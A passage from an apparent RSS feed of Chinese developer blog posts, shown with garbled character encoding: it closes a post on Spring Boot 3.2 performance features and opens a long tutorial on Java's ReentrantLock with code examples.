<li><strong>ç±»åŠ è½½åŠ é€Ÿ</strong>ï¼šé€šè¿‡é¢„å…ˆè®¡ç®—Beanä¾èµ–å…³ç³»ï¼ˆå­˜å‚¨åœ¨ <code>META-INF/spring/aot.factories</code>ï¼‰ï¼Œé¿å…è¿è¡Œæ—¶åå°„æ‰«æç±»è·¯å¾„ã€‚</li>
<li><strong>æ–¹æ³•å†…è”å¢å¼º</strong>ï¼šç»“åˆJITç¼–è¯‘å™¨å¯¹é«˜é¢‘è°ƒç”¨çš„æ¡†æ¶ä»£ç ï¼ˆå¦‚æ³¨è§£å¤„ç†å™¨ï¼‰è¿›è¡Œæ¿€è¿›å†…è”ï¼Œå•è¯·æ±‚å¤„ç†è€—æ—¶é™ä½15%~20%ã€‚</li>
</ol>
<p><img src="https://example.com/jit-aot.png" alt="JIT vs AOT" loading="lazy"/> <em>å›¾ï¼šAOTé¢„å¤„ç†ä¸JITè¿è¡Œæ—¶ä¼˜åŒ–çš„åä½œæµç¨‹</em></p>
<hr/>
<h3 data-id="heading-6">4. <strong>æ–°ä¸€ä»£è¿æ¥æ± HikariCPçš„æ€§èƒ½è°ƒä¼˜</strong></h3>
<p>è™½ç„¶HikariCPå·²æ˜¯é»˜è®¤è¿æ¥æ± ï¼Œä½†SpringBoot 3.2å¯¹å…¶è¿›è¡Œäº†æ·±åº¦æ•´åˆï¼š</p>
<ul>
<li><strong>è‡ªé€‚åº”ç©ºé—²è¿æ¥å›æ”¶</strong>ï¼šæ ¹æ®å†å²æµé‡æ¨¡å¼åŠ¨æ€è°ƒæ•´ <code>idleTimeout</code>ï¼ˆé¿å…å›ºå®šå€¼å¯¼è‡´çš„è¿æ¥æŠ–åŠ¨ï¼‰ã€‚</li>
<li><strong>æ‰¹é‡æ“ä½œæµæ°´çº¿åŒ–</strong>ï¼šå¯¹JDBCæ‰¹å¤„ç†APIçš„é‡æ„ä½¿å¾—æ‰¹é‡æ’å…¥æ€§èƒ½æå‡çº¦40%ï¼ˆMySQLå®æµ‹ï¼‰ã€‚</li>
<li><strong>è¯Šæ–­å¢å¼º</strong>ï¼šæ–°å¢ <code>/actuator/poolmetrics</code>ç«¯ç‚¹æš´éœ²ç»†ç²’åº¦ç›‘æ§æŒ‡æ ‡ã€‚</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.ymlé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">spring:</span>
 <span class="hljs-attr">datasource:</span>
   <span class="hljs-attr">hikari:</span>
     <span class="hljs-attr">maximum-pool-size:</span> <span class="hljs-string">${DB_POOL_SIZE:20}</span>
     <span class="hljs-attr">optimization-overrides:</span>
       <span class="hljs-attr">batch-size:</span> <span class="hljs-string">rewriteBatchedStatements=true</span>
</code></pre>
<hr/>
<h3 data-id="heading-7">5. <strong>èµ„æºå¤„ç†ä¸é™æ€å†…å®¹åˆ†å‘çš„é›¶æ‹·è´ä¼˜åŒ–</strong></h3>
<p>é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½å’Œé™æ€èµ„æºæœåŠ¡åœºæ™¯ï¼š</p>
<ol>
<li><strong>PathResourceçš„é«˜æ•ˆæ˜ å°„</strong>:  ç›´æ¥é€šè¿‡NIOçš„ <code>FileChannel.transferTo()</code>å®ç°é›¶æ‹·è´ä¼ è¾“ï¼ˆç»•è¿‡å †å†…å­˜ç¼“å†²ï¼‰ã€‚</li>
<li><strong>HTTPç¼“å­˜å¤´è‡ªåŠ¨åŒ–</strong>:  æ ¹æ®æ–‡ä»¶å“ˆå¸Œè‡ªåŠ¨ç”Ÿæˆ <code>ETag</code>å’Œ <code>Cache-Control</code>å¤´éƒ¨ã€‚</li>
<li>Brotliå‹ç¼©æ”¯æŒ:  åœ¨GZIPåŸºç¡€ä¸Šæ–°å¢Brotliç®—æ³•å‹ç¼©é™æ€èµ„æºï¼ˆèŠ‚çœ15%~25%å¸¦å®½ï¼‰ã€‚</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// WebMvcConfigurerç¤ºä¾‹</span>
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> {
    registry.addResourceHandler(<span class="hljs-string">"/static/**"</span>)
            .addResourceLocations(<span class="hljs-string">"classpath:/static/"</span>)
            .setUseLastModified(<span class="hljs-literal">true</span>);
}
</code></pre>
<hr/>
<h2 data-id="heading-8">ğŸ¯æ€»ç»“</h2>
<p>SpringBoot</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[1.5wå­—ReentrantLock æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7580616979473022982</link>    <guid>https://juejin.cn/post/7580616979473022982</guid>    <pubDate>2025-12-08T02:54:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580616979473022982" data-draft-id="7580372534043967531" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="1.5wå­—ReentrantLock æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="Java,åç«¯,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-12-08T02:54:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é•œèŠ±æ°´æœˆlinyi"/> <meta itemprop="url" content="https://juejin.cn/user/451256763295396"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            1.5wå­—ReentrantLock æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/451256763295396/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é•œèŠ±æ°´æœˆlinyi
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T02:54:59.000Z" title="Mon Dec 08 2025 02:54:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»52åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç¬¬ä¸€ç« ï¼šReentrantLock å…¥é—¨</h2>
<h3 data-id="heading-1">1. ä¸ºä»€ä¹ˆéœ€è¦ReentrantLock</h3>
<p>åœ¨Javaæ—©æœŸç‰ˆæœ¬ä¸­ï¼Œ<code>synchronized</code>æ˜¯å”¯ä¸€çš„åŒæ­¥æœºåˆ¶ã€‚ç„¶è€Œï¼Œéšç€å¹¶å‘ç¼–ç¨‹éœ€æ±‚çš„æ—¥ç›Šå¤æ‚ï¼Œ<code>synchronized</code>çš„å±€é™æ€§é€æ¸æ˜¾ç°ï¼ŒJDK 1.5å¼•å…¥äº†<code>java.util.concurrent.locks</code>åŒ…ï¼Œå…¶ä¸­<code>ReentrantLock</code>æˆä¸ºäº†æœ€é‡è¦çš„æ˜¾å¼é”å®ç°ã€‚</p>
<h4 data-id="heading-2">1.1 synchronizedçš„å±€é™æ€§</h4>
<p><code>synchronized</code>æ˜¯Javaå†…ç½®çš„åŒæ­¥å…³é”®å­—ï¼Œä½¿ç”¨ç®€å•ï¼Œä½†å­˜åœ¨ä»¥ä¸‹å±€é™ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * synchronizedçš„å±€é™æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SynchronizedLimitations</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-comment">/**
     * å±€é™1ï¼šæ— æ³•ä¸­æ–­ç­‰å¾…
     * çº¿ç¨‹åœ¨ç­‰å¾…synchronizedé”æ—¶ï¼Œæ— æ³•å“åº”ä¸­æ–­
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotInterrupt</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// å¦‚æœå…¶ä»–çº¿ç¨‹æŒæœ‰é”å¾ˆé•¿æ—¶é—´ï¼Œå½“å‰çº¿ç¨‹åªèƒ½ä¸€ç›´ç­‰å¾…</span>
            <span class="hljs-comment">// å³ä½¿è°ƒç”¨äº† thread.interrupt()ï¼Œä¹Ÿæ— æ³•ä¸­æ–­ç­‰å¾…</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™2ï¼šæ— æ³•è®¾ç½®è¶…æ—¶
     * å¿…é¡»æ— é™æœŸç­‰å¾…ï¼Œç›´åˆ°è·å–åˆ°é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// æ— æ³•æŒ‡å®š"å¦‚æœ3ç§’å†…è·å–ä¸åˆ°é”å°±æ”¾å¼ƒ"</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™3ï¼šæ— æ³•å°è¯•è·å–
     * ä¸èƒ½éé˜»å¡åœ°å°è¯•è·å–é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotTryLock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ— æ³•å®ç°ï¼šå¦‚æœé”å¯ç”¨å°±è·å–ï¼Œå¦åˆ™ç«‹å³è¿”å›</span>
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// ...</span>
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™4ï¼šåªæ”¯æŒå•ä¸€æ¡ä»¶
     * Objectçš„wait/notifyåªèƒ½æœ‰ä¸€ä¸ªç­‰å¾…é›†åˆ
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">singleCondition</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-keyword">synchronized</span> (lock) {
            <span class="hljs-comment">// åªèƒ½è°ƒç”¨ lock.wait()ï¼Œæ‰€æœ‰ç­‰å¾…çº¿ç¨‹å…±ç”¨ä¸€ä¸ªé˜Ÿåˆ—</span>
            <span class="hljs-comment">// æ— æ³•åŒºåˆ†"ç­‰å¾…ç©ºé—´"å’Œ"ç­‰å¾…æ•°æ®"çš„çº¿ç¨‹</span>
            lock.wait();
        }
    }
    
    <span class="hljs-comment">/**
     * å±€é™5ï¼šæ— æ³•æŸ¥è¯¢é”çŠ¶æ€
     * ä¸çŸ¥é“é”æ˜¯å¦è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cannotQueryState</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// æ— æ³•åˆ¤æ–­é”æ˜¯å¦è¢«å ç”¨</span>
        <span class="hljs-comment">// æ— æ³•çŸ¥é“å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
    }
}
</code></pre>
<h4 data-id="heading-3">1.2 ReentrantLockçš„ä¼˜åŠ¿</h4>
<p><code>ReentrantLock</code>å®Œç¾è§£å†³äº†ä¸Šè¿°æ‰€æœ‰é—®é¢˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f201063f619487c9883935393a1e3bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=H0djeUX0bn7yWySLAIPWwGHSibw%3D" alt="synchronized-vs-reentrantlock.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-4">1.3 ä»€ä¹ˆæ—¶å€™é€‰æ‹©ReentrantLock</h4>













































<table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ¨èé€‰æ‹©</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left">ç®€å•åŒæ­¥ï¼Œæ€§èƒ½è¦æ±‚ä¸é«˜</td><td align="left">synchronized</td><td align="left">è¯­æ³•ç®€å•ï¼Œè‡ªåŠ¨é‡Šæ”¾</td></tr><tr><td align="left">éœ€è¦å¯ä¸­æ–­ç­‰å¾…</td><td align="left">ReentrantLock</td><td align="left">lockInterruptibly()</td></tr><tr><td align="left">éœ€è¦è¶…æ—¶è·å–</td><td align="left">ReentrantLock</td><td align="left">tryLock(timeout)</td></tr><tr><td align="left">éœ€è¦å…¬å¹³é”</td><td align="left">ReentrantLock</td><td align="left">new ReentrantLock(true)</td></tr><tr><td align="left">éœ€è¦å¤šä¸ªç­‰å¾…æ¡ä»¶</td><td align="left">ReentrantLock</td><td align="left">newCondition()</td></tr><tr><td align="left">éœ€è¦æŸ¥è¯¢é”çŠ¶æ€</td><td align="left">ReentrantLock</td><td align="left">isLocked()ç­‰æ–¹æ³•</td></tr><tr><td align="left">é”ç²’åº¦éœ€è¦æ›´ç»†</td><td align="left">ReentrantLock</td><td align="left">æ›´çµæ´»çš„åŠ é”/è§£é”æ§åˆ¶</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-5">2. ReentrantLockæ ¸å¿ƒæ¦‚å¿µ</h3>
<h4 data-id="heading-6">2.1 ä»€ä¹ˆæ˜¯ReentrantLock</h4>
<p><code>ReentrantLock</code>æ˜¯ä¸€ä¸ª<strong>å¯é‡å…¥çš„äº’æ–¥é”</strong>ï¼ˆReentrant Mutual Exclusion Lockï¼‰ã€‚è®©æˆ‘ä»¬æ‹†è§£è¿™ä¸ªå®šä¹‰ï¼š</p>
<ul>
<li><strong>å¯é‡å…¥ï¼ˆReentrantï¼‰</strong>ï¼šåŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ï¼Œä¸ä¼šé€ æˆæ­»é”</li>
<li><strong>äº’æ–¥ï¼ˆMutual Exclusionï¼‰</strong>ï¼šåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰é”</li>
<li><strong>é”ï¼ˆLockï¼‰</strong>ï¼šç”¨äºæ§åˆ¶å¯¹å…±äº«èµ„æºçš„è®¿é—®</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯é‡å…¥ç‰¹æ€§æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantDemo</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">outer</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–é”ï¼ŒholdCount = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"outeræ–¹æ³•è·å–é”"</span>);
            inner();  <span class="hljs-comment">// è°ƒç”¨å†…éƒ¨æ–¹æ³•ï¼Œå†æ¬¡è·å–åŒä¸€æŠŠé”</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼ŒholdCount = 0</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inner</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–é”ï¼ŒholdCount = 2ï¼ˆå¯é‡å…¥ï¼ï¼‰</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"inneræ–¹æ³•è·å–é”"</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// é‡Šæ”¾é”ï¼ŒholdCount = 1</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">ReentrantDemo</span> <span class="hljs-variable">demo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantDemo</span>();
        demo.outer();  <span class="hljs-comment">// ä¸ä¼šæ­»é”ï¼</span>
    }
}
</code></pre>
<h4 data-id="heading-7">2.2 å…¬å¹³é”ä¸éå…¬å¹³é”</h4>
<p><code>ReentrantLock</code>æ”¯æŒä¸¤ç§è·å–é”çš„ç­–ç•¥</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9dca1eb396394912bde3f55d83c983c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=BjhKyioFUHsr43hjz6xclPl0Awg%3D" alt="fair-vs-nonfair-lock.drawio.png" loading="lazy"/></p>
<p><strong>éå…¬å¹³é”</strong>ï¼ˆé»˜è®¤ï¼‰ï¼š</p>
<ul>
<li>æ–°çº¿ç¨‹å¯ä»¥"æ’é˜Ÿ"ï¼Œç›´æ¥å°è¯•è·å–é”</li>
<li>ä¼˜ç‚¹ï¼šååé‡é«˜ï¼Œå‡å°‘çº¿ç¨‹åˆ‡æ¢å¼€é”€</li>
<li>ç¼ºç‚¹ï¼šå¯èƒ½å¯¼è‡´æŸäº›çº¿ç¨‹"é¥¥é¥¿"ï¼ˆé•¿æœŸç­‰å¾…ï¼‰</li>
</ul>
<p><strong>å…¬å¹³é”</strong>ï¼š</p>
<ul>
<li>ä¸¥æ ¼æŒ‰ç…§å…ˆæ¥ååˆ°çš„é¡ºåºè·å–é”</li>
<li>ä¼˜ç‚¹ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½èƒ½å…¬å¹³è·å¾—æ‰§è¡Œæœºä¼š</li>
<li>ç¼ºç‚¹ï¼šååé‡è¾ƒä½ï¼Œéœ€è¦é¢‘ç¹çš„çº¿ç¨‹åˆ‡æ¢</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// å…¬å¹³é”</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
</code></pre>
<h4 data-id="heading-8">2.3 ç±»ç»“æ„æ¦‚è§ˆ</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/920a0ec7b24e4a9ea7c607b3b990fa1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=JiT87vwNMgrS2IG8zUUK0jcbOTg%3D" alt="reentrantlock-class-diagram.drawio.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-9">3. åŸºç¡€APIè¯¦è§£</h3>
<h4 data-id="heading-10">3.1 APIæ€»è§ˆ</h4>






















































<table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">è¯´æ˜</th><th align="left">é˜»å¡</th><th align="left">å¯ä¸­æ–­</th><th align="left">å¯è¶…æ—¶</th></tr></thead><tbody><tr><td align="left"><code>lock()</code></td><td align="left">è·å–é”</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">âŒ</td></tr><tr><td align="left"><code>lockInterruptibly()</code></td><td align="left">å¯ä¸­æ–­åœ°è·å–é”</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âŒ</td></tr><tr><td align="left"><code>tryLock()</code></td><td align="left">å°è¯•è·å–é”ï¼ˆéé˜»å¡ï¼‰</td><td align="left">âŒ</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><code>tryLock(time, unit)</code></td><td align="left">è¶…æ—¶è·å–é”</td><td align="left">âœ…</td><td align="left">âœ…</td><td align="left">âœ…</td></tr><tr><td align="left"><code>unlock()</code></td><td align="left">é‡Šæ”¾é”</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr><tr><td align="left"><code>newCondition()</code></td><td align="left">åˆ›å»ºæ¡ä»¶å˜é‡</td><td align="left">-</td><td align="left">-</td><td align="left">-</td></tr></tbody></table>
<h4 data-id="heading-11">3.2 lock() - è·å–é”</h4>
<p><code>lock()</code>æ˜¯æœ€åŸºæœ¬çš„è·å–é”æ–¹æ³•ã€‚å¦‚æœé”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰ï¼Œå½“å‰çº¿ç¨‹ä¼šé˜»å¡ç­‰å¾…ï¼Œç›´åˆ°è·å–åˆ°é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * lock()æ–¹æ³•ä½¿ç”¨ç¤ºä¾‹
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockExample</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">/**
     * æ ‡å‡†ä½¿ç”¨æ¨¡å¼ï¼šlock-try-finally-unlock
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// è·å–é”</span>
        <span class="hljs-keyword">try</span> {
            count++;  <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç </span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// å¿…é¡»åœ¨finallyä¸­é‡Šæ”¾é”ï¼</span>
        }
    }
    
    <span class="hljs-comment">/**
     * é”™è¯¯ç¤ºä¾‹ï¼šæ²¡æœ‰åœ¨finallyä¸­é‡Šæ”¾é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">wrongUsage</span><span class="hljs-params">()</span> {
        lock.lock();
        count++;
        lock.unlock();  <span class="hljs-comment">// å¦‚æœcount++æŠ›å¼‚å¸¸ï¼Œé”æ°¸è¿œä¸ä¼šé‡Šæ”¾ï¼</span>
    }
}
</code></pre>
<blockquote>
